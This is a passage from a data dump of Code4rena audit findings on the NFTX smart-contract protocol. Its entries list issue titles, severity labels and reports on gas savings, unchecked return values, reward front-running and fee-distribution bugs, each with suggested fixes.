state variable is less efficient than uint256"}, {"title": "Unused state variables", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/169", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Unused state variables"}, {"title": "Cache duplicate external calls", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/167", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Cache duplicate external calls"}, {"title": "Check if amount > 0 before token transfer can save gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/165", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L247-L248  ```solidity=247 uint256 remaining = WETH.balanceOf(address(this)); WETH.transfer(to, remaining); ```  Since `WETH.balanceOf(address(this))` can to be `0`. Checking `if (remaining > 0)` before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.  "}, {"title": "Unused function parameters", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  Unused function parameters increase contract size and gas usage at deployment.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L496-L511  ```solidity=496   function _buyVaultToken(     address vault,      uint256 minTokenOut,      uint256 maxWethIn,      address[] calldata path   ) internal returns (uint256[] memory) {     uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(       minTokenOut,       maxWethIn,       path,        address(this),       block.timestamp     );      return amounts;   } ```  `vault` is unused.  "}, {"title": "Unused local variables", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/163", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Unused local variables"}, {"title": "Unused events", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/162", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Unused events"}, {"title": "`NFTXMarketplaceZap.sol#buyAnd***()` should return unused weth/eth back to `msg.sender` instead of `to`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/161", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "`NFTXMarketplaceZap.sol#buyAnd***()` should return unused weth/eth back to `msg.sender` instead of `to`"}, {"title": "Inline unnecessary function can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Inline unnecessary function can make the code simpler and save some gas"}, {"title": "`NFTXMarketplaceZap.sol#buyAndSwap1155WETH()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/156", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "`NFTXMarketplaceZap.sol#buyAndSwap1155WETH()` Implementation can be simpler and save some gas"}, {"title": "NFTXStakingZap, NFTXMarketplaceZap and NFTXVaultUpgradeable use hard coded Cryptokitties and CryptoPunks addresses", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/155", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "NFTXStakingZap, NFTXMarketplaceZap and NFTXVaultUpgradeable use hard coded Cryptokitties and CryptoPunks addresses"}, {"title": "Outdated comment in `TimelockRewardDistributionTokenImpl.burnFrom`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/150", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cmichel   # Vulnerability details  The comment in `TimelockRewardDistributionTokenImpl.burnFrom` says: > the caller must have allowance for ``accounts``'s tokens of at least `amount`.  This was the case in a previous version but not anymore. The owner does not need to be approved to burn tokens anymore.  ## Recommended Mitigation Steps Update the comment to clarify the behavior.   "}, {"title": "Unbounded iteration in `NFTXVaultUpgradeable.allHoldings` over all holdings", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/147", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Unbounded iteration in `NFTXVaultUpgradeable.allHoldings` over all holdings"}, {"title": "Staking Zap approves wrong LP token", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/143", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Staking Zap approves wrong LP token"}, {"title": "Low-level call return value not checked", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/140", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cmichel   # Vulnerability details  The `NFTXStakingZap.addLiquidity721ETHTo` function performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeded.  ## Impact If the call fails, the refunds did not succeed and the caller will lose all refunds of `msg.value - amountEth`.  ## Recommended Mitigation Steps Revert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.  "}, {"title": "Zaps should verify paths", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/137", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Zaps should verify paths"}, {"title": "Rewards can be stolen", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/136", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cmichel   # Vulnerability details  The `NFTXInventoryStaking` contract distributes new rewards to all previous stakers when the owner calls the `receiveRewards` function. This allows an attacker to frontrun this `receiveRewards` transaction when they see it in the mem pool with a `deposit` function. The attacker will receive the rewards pro-rata to their deposits. The deposit will be locked for 2 seconds only (`DEFAULT_LOCKTIME`) after which the depositor can withdraw their initial deposit & the rewards again for a profit.  The rewards can be gamed this way and one does not actually have to _stake_, only be in the staking contract at the time of reward distribution for 2 seconds. The rest of the time they can be used for other purposes.  ## Recommended Mitigation Steps Distribute the rewards equally over time to the stakers instead of in a single chunk on each `receiveRewards` call. This is more of a \"streaming rewards\" approach.   "}, {"title": "Same module can be added several times", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/135", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Same module can be added several times"}, {"title": "Race condition in approve() \u6536\u4ef6\u7bb1", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/134", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Race condition in approve() \u6536\u4ef6\u7bb1"}, {"title": " Use `calldata` instead of `memory` for function parameters", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": " Use `calldata` instead of `memory` for function parameters"}, {"title": "Use a constant instead of block.timestamp for the deadline", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Use a constant instead of block.timestamp for the deadline"}, {"title": "After Solidity 0.8.1, The Inline Assembly Contract Check Can Be replaced with the new function", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "After Solidity 0.8.1, The Inline Assembly Contract Check Can Be replaced with the new function"}, {"title": "Weak nonce usage", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/126", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-nftx-findings", "body": "Weak nonce usage"}, {"title": "Internal functions names should start with underscore", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/124", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  Multiple internal functions do not have a name that starts with an underscore. The lack of clarity over the functions visibility could lead to misuse of these functions.  ## Proof of Concept Both the NFTXMarketplaceZap.sol and NFTXStakingZap.sol contracts have three internal functions names without underscores: approveERC721 in NFTXMarketplaceZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L574 approveERC721 in NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L434 pairFor in NFTXMarketplaceZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L593 pairFor in NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L453 sortTokens in NFTXMarketplaceZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L604 sortTokens in NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L464  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Rename internal functions following best practices to clarify function visibility  "}, {"title": "Local variables shadowing", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/123", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  If two variables with the same name exist in a function, but one is imported from another contract while the other is created locally, it is unclear which value is being used or should be used. Avoiding variable name collisions avoids confusion and the risks of using the wrong variable.  https://swcregistry.io/docs/SWC-119  ## Proof of Concept  Several instance of this issue exist. 1. mintAndSell1155() function in NFTXMarketplaceZap.sol has `uint256[] memory amounts` as an input parameter and later it is redeclared in the function https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L368,L376 2. pauseFeeDistribution() function in NFTXSimpleFeeDistributor.sol uses a pause return bool which shadows PausableUpgradeable.pause https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L140 3. transferFromERC721() function in NFTXStakingZap.sol declares an `address owner` which shadows Ownable.owner(): https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L422 4. transferFromERC721() function in NFTXMarketplaceZap.sol declares an `address owner` which shadows Ownable.owner(): https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L562  ## Tools Used  Slither, shadowing-local detector: https://github.com/crytic/slither/wiki/Detector-Documentation#local-variable-shadowing  ## Recommended Mitigation Steps  Rename local variables to avoid shadowing. For instance, add an underscore in front of the name of local variables.  "}, {"title": "Missing address(0) checks", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/122", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Missing address(0) checks"}, {"title": "Return variable can remain unassigned in _sendForReceiver", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/121", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `_sendForReceiver()` function only sets a return function in the \"if\" code block, not the \"else\" case. If the \"else\" case is true, no value is returned. The result of this oversight is that the `_sendForReceiver()` function called from the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. The `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. This issue is partially due to [Solidity using implicit returns](https://github.com/ethereum/solidity/issues/2951), so if no bool value is explicitly returned, the default bool value of False will be returned.  This problem currently occurs for any receiver with `isContract` set to False. The `_addReceiver` function allows for `isContract` to be set to False, so such a condition should not result in tokens being sent to the treasury as though it was an emergency scenario.  ## Proof of Concept  The `else` block is missing a return value https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L167-L169  ## Tools Used  VS Code \"Solidity Visual Developer\" extension  ## Recommended Mitigation Steps  Verify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this.  Alternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value.  "}, {"title": "Refactor `distribute()` logic", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Refactor `distribute()` logic"}, {"title": "Store totalSupply() in variable", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/119", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Store totalSupply() in variable"}, {"title": "provideInventory1155 assumes tokenIds.length == amounts.length", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/117", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `provideInventory1155()` function in contracts/solidity/NFTXStakingZap.sol contains a for loop that uses tokenIds.length to loop through the amounts array. However, if these two arrays are not the same length, the loop with trigger an error. The error could be triggered after many operations already occur, so checking that these two lengths are equal first could save gas.  ## Proof of Concept  The `provideInventory1155()` function contracts/solidity/NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L201  ## Recommended Mitigation Steps  There are two main options to reducing the gas spend in an error condition: 1. Add the following line as the first line of the `provideInventory1155()` function: `require(tokenIds.length == amounts.length)` 2. In the for loop within the `provideInventory1155()` function, replace `i < tokenIds.length` with `i < amounts.length;`  "}, {"title": "Incorrect contract referenced in test", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/116", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The file contracts/solidity/testing/NFTXFeeDistributor2.sol references the old NFTXFeeDistributor.sol and instead should reference the new NFTXSimpleFeeDistributor.sol  ## Proof of Concept  The import and contract inheritance of contracts/solidity/testing/NFTXFeeDistributor2.sol  ## Tools Used  `npx hardhat test` fails due to this issue because the ../NFTXFeeDistributor.sol imported file is not found  ## Recommended Mitigation Steps  Reference the new NFTXSimpleFeeDistributor.sol and not NFTXFeeDistributor.sol in the import and contract inheritance  "}, {"title": "NFTXInventoryStaking._deployXToken create2 deploy result isn't zero checked", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/115", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  deployXTokenForVault call will not revert on deploy failure.  ## Proof of Concept  NFTXInventoryStaking._deployXToken is called by deployXTokenForVault: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L64  _deployXToken uses deploy generated address without check: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L160  ## Recommended Mitigation Steps  Require non zero deployedXToken address before calling __XToken_init.  "}, {"title": "NFTXVaultUpgradeable.mintTo and swapTo do not check for user supplied arrays length", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/111", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  On calling with arrays of different lengths various malfunctions are possible as the arrays are used as given. mintTo and swapTo outcome will not be as expected by a caller.  ## Proof of Concept  The arrays are used whenever Vault is ERC1155, i.e. when is1155 is true.  swap -> swapTo uses the arrays as given: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L258  mint -> mintTo, arrays are passed on without checks to receiveNFTs: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L190  receiveNFTs uses the arrays in a loop, assuming equal lengths without a check: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L389  ## Recommended Mitigation Steps  Add `require(tokenIds.length == amounts.length, \"tokenIds and amounts length should match\")` check in the beginning of public mintTo and swapTo endpoints.   "}, {"title": "Move kitties/punk addresses to constants", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/110", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Move kitties/punk addresses to constants"}, {"title": "Misleading comments", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/109", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  `XTokenUpgradeable.sol` contains many comments regarding SushiBar. It looks like the comments have been copy-pasted from another contract, and may be deceiving for a reader  ## Proof of Concept  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L14](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L14)  ## Tools Used  ## Recommended Mitigation Steps  Remove said comments  "}, {"title": "Unfair fee distribution", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/108", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Detailed description of the impact of this finding.  Fee distribution algorithm in `NFTXSimpleFeeDistributor.sol` can led to unfair distribution of fees among receivers. The `_sendForReceiver` function returns `success = true` only when the call to receiver' `receiveRewards` is successful and the whole amount is transfered to the receiver. Otherwise, the entire fee is moved up to the next receiver, and finally to the treasury.  If a badly implemented receiver leaves a part of the fee (even 1 wei) to the fee distributor, the operation is considered unsuccessful and the entire amount of the fee is moved up to the next receiver. This could lead to the situation where one of the late receivers is unable to receive any fee at all, since some previous receiver has received more than it should have.  ## Proof of Concept  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L166](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L166)  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L69](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L69)  ## Tools Used  Editor  ## Recommended Mitigation Steps  `_sendForReceiver` should return a tuple: `(bool success, uint256 amountLeft)`. Then `amountLeft` should be used by `distribute` for the `leftover` variable  "}, {"title": "A vault can be locked from MarketplaceZap and StakingZap", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/107", "labels": ["bug", "3 (High Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Any user that owns a vToken of a particular vault can lock the functionalities of `NFTXMarketplaceZap.sol` and `NFTXStakingZap.sol` for everyone.  Every operation performed by the marketplace, that deals with vToken minting, performs this check:  ```jsx require(balance == IERC20Upgradeable(vault).balanceOf(address(this)), \"Did not receive expected balance\"); ```  A malicious user could transfer any amount > 0 of a vault\u2019vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace  ## Proof of Concept  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421)  [https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Remove this logic from the marketplace and staking zap contracts, and add it to the vaults (if necessary)  "}, {"title": "NFTXSimpleFeeDistributor._sendForReceiver doesn't return success if receiver is not a contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/105", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  Double spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones. As `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.  ## Proof of Concept  `distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67  `_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed. When `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168  This way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice: https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64  ## Recommended Mitigation Steps  Now: ``` function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {  if (_receiver.isContract) {  ...  } else {   IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);  } } ```  To be: ``` function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {  if (_receiver.isContract) {  ...  } else {   IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);   return true;  } } ```  "}, {"title": "Remove unnecessary variables can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/101", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Remove unnecessary variables can make the code simpler and save some gas"}, {"title": "Use immutable variables can save gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Use immutable variables can save gas"}, {"title": "Using constants instead of local variables can save some gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Using constants instead of local variables can save some gas"}, {"title": "`transfer()` is not recommended for sending ETH", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/94", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  Since the introduction of `transfer()`, it has typically been recommended by the security community because it helps guard against reentrancy attacks. This guidance made sense under the assumption that gas costs wouldn\u2019t change. It's now recommended that transfer() and send() be avoided, as gas costs can and will change and reentrancy guard is more commonly used.  Any smart contract that uses `transfer()` is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300.  It's recommended to stop using `transfer()` and switch to using `call()` instead.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXV1Buyout.sol#L44-L44  ```solidity payable(msg.sender).transfer(amount); ```  Can be changed to:  ```solidity (bool success, ) = msg.sender.call{value: amount}(\"\"); require(success, \"ETH transfer failed\"); ```  "}, {"title": "`NFTXSimpleFeeDistributor#__SimpleFeeDistributor__init__()` Missing `__ReentrancyGuard_init()`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/90", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L15-L15  ```solidity=15 contract NFTXSimpleFeeDistributor is INFTXSimpleFeeDistributor, ReentrancyGuardUpgradeable, PausableUpgradeable { ```  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L41-L47  ```solidity=41   function __SimpleFeeDistributor__init__(address _lpStaking, address _treasury) public override initializer {     __Pausable_init();     setTreasuryAddress(_treasury);     setLPStakingAddress(_lpStaking);      _addReceiver(0.8 ether, lpStaking, true);   } ```  For the upgradeable variants of OpenZipplin contracts, they should be initialized by calling the `__***_init()` function in the initializer function.  Therefore, `__SimpleFeeDistributor__init__()` should call `__ReentrancyGuard_init()` at L42.  "}, {"title": "Avoid unnecessary external call can save gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Avoid unnecessary external call can save gas"}, {"title": "Outdated compiler version", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/88", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Outdated compiler version"}, {"title": "Unchecked return value for `ERC20.approve` call", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/87", "labels": ["bug", "duplicate", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Unchecked return value for `ERC20.approve` call"}, {"title": "Constants are not explicitly declared", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/82", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Constants are not explicitly declared"}, {"title": "Timelock functionality for `xToken` is applied on all existing balance", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/80", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Timelock functionality for `xToken` is applied on all existing balance"}, {"title": "Rewards Cannot Be Claimed If LP Tokens Are Unstaked", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/73", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  `TimelockRewardDistributionTokenImpl` calculates the accumulative reward according to the following function: ``` function accumulativeRewardOf(address _owner) public view returns(uint256) {   return magnifiedRewardPerShare.mul(balanceOf(_owner)).toInt256()     .add(magnifiedRewardCorrections[_owner]).toUint256Safe() / magnitude; } ```  The calculation takes into consideration the LP token balance of token holders. Hence, if the token holder has called `emergencyExit` or `withdraw` in `NFTXLPStaking`, the LP tokens are removed from the staking contract without claiming rewards prior to this action. Therefore, in order for users to claim their fair share of rewards they must restake LP tokens and call `claimRewards`.   Similarly, `_transfer` in `TimelockRewardDistributionTokenImpl` also does not force the `from` account to claim rewards first.  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L195-L198 ``` function withdraw(uint256 vaultId, uint256 amount) external {     StakingPool memory pool = vaultStakingInfo[vaultId];     _withdraw(pool, amount, msg.sender); } ```  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L157-L162 ``` function emergencyExit(address _stakingToken, address _rewardToken) external {     StakingPool memory pool = StakingPool(_stakingToken, _rewardToken);     TimelockRewardDistributionTokenImpl dist = _rewardDistributionTokenAddr(pool);     require(isContract(address(dist)), \"Not a pool\");     _withdraw(pool, 